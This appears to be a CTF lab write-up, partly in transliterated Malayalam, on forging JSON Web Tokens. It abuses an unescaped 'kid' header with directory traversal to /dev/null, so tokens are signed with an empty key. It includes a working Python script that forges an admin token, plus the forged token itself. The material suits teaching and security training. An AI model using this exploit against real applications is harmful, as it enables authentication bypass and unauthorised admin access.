-->This course details the exploitation of a weakness in the usage of JSON Web Token (JWT). In this application, JWT is used for authentication. Upon successful login, the user is issued a JWT in a cookie. This exercise was one of the challenges during [BitcoinCTF](https://bitcoinctf.com): one of the best and most complex web Capture-The-Flag.

## The vulnerability
-->This issue comes from one of the fields in the header: kid.
-->This parameter is available in some libraries, it's short for key identifier.
-->In this application, the kid is used without proper escaping to retrieve the key.
-->This lack of escaping could lead to multiple types of vulnerabilities, such as:
-   SQL injections.
-   Directory traversals.
-   ...

## Exploitation
-->First, you will need to automate the testing and see what happens when you tamper with the kid value.
-->After poking for a bit, you should be able to discover what type of vulnerabilities are present in the retrieval of the key
-->Using this, you will need to find a file with a content that you can predict, and use it to sign your malicious JWT.

## Conclusion
-->This exercise showed you another way to tamper with a JWT to gain administrator access in an application.
-->It showed you that having a signed value is only as strong as the way the signature is handled.
-->Here by finding a vulnerability in the way the key was retrieved, you were able to use a weak key and bypass the signature.

## Video Explanation
## Video -1 introduction
-->ivide kid enna paramter jwt token il use chyunund.ee parameter use chyunath enthinanenal original key point chyuka ennathan ee kid paramter inte job.key ullath valla database ilo, or file system ilo aakum.so evideyan key ullath avide point chyuth nokum namude kid parameter
-->Ingane database il oke aan key ullathengil namuk sqli polula vulnerabilities oke try chyam
-->so ivide lab il ee injection vech namal directory traversal aan chyunath
-->you can use any files for which you can predict the content (for example /dev/null)
-->dev/null namuk empty or nothing result tharum enariyalo.

## Video 2- python exploitation 

```python
import hmac
import base64
import hashlib
import json

from sys import version_info

header = {"typ":"JWT","alg":"HS256","kid":"../../../../../../dev/null"}
key = ""

payload = {"user":"admin"}

if version_info[0] == 2:
	str = base64.urlsafe_b64encode(json.dumps(header)).rstrip("=")+"."+base64.urlsafe_b64encode(json.dumps(payload)).rstrip("=")
	sig = base64.urlsafe_b64encode(hmac.new(key,str,hashlib.sha256).digest()).decode('utf8').rstrip("=")
else:
	str = base64.urlsafe_b64encode(bytes(json.dumps(header),encoding='utf8')).decode('utf8').rstrip("=")+"."+base64.urlsafe_b64encode(bytes(json.dumps(payload),encoding='utf8')).decode('utf8').rstrip("=")
	sig = base64.urlsafe_b64encode(hmac.new(bytes(key,encoding='utf8'),str.encode('utf8'),hashlib.sha256).digest()).decode('utf8').rstrip("=")
print(str+"."+sig)
```
-->so ee code or .py file il aaki python3 vech runc chyunu.apol namuk ingane oru token kitunu :
```http
eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJIUzI1NiIsICJraWQiOiAiLi4vLi4vLi4vLi4vLi4vLi4vZGV2L251bGwifQ.eyJ1c2VyIjogImFkbWluIn0.pcLzBQQQoPb7UyhXzsb7o0N9AMfFKdbFKa2_vTL9qk0
```
-->mukalile code noke.athil header variable ile kid paramter il naaml directory traverse chyunu ie, /dev/null kodukunu.apol applicatin athil onum kanunila.so secret key empty aakunu.angnae namuk admin aayi maran patunu ok
-->NOTE : ivide namal python3 mathramala marich python2 inte code um orumich chyunu.athan aa if else kanunath.if il ullath python2 inte code um else il ullath python3 inte code um aan ok.so indiviudal aayi ee code namal mati ittalum namuk admin aayi maran patum. ie,
-->just python3 code mathram :
```python
import hmac
import base64
import hashlib
import json


header = {"typ":"JWT","alg":"HS256","kid":"../../../../../../dev/null"}
key = ""

payload = {"user":"admin"}

str = base64.urlsafe_b64encode(bytes(json.dumps(header),encoding='utf8')).decode('utf8').rstrip("=")+"."+base64.urlsafe_b64encode(bytes(json.dumps(payload),encoding='utf8')).decode('utf8').rstrip("=")
sig = base64.urlsafe_b64encode(hmac.new(bytes(key,encoding='utf8'),str.encode('utf8'),hashlib.sha256).digest()).decode('utf8').rstrip("=")
print(str+"."+sig)
```
-->ipol python3 code mtharam aan.ok. ini ee code run chyth kituna token eduth replace chythalum namuk admin aayi marann patum ok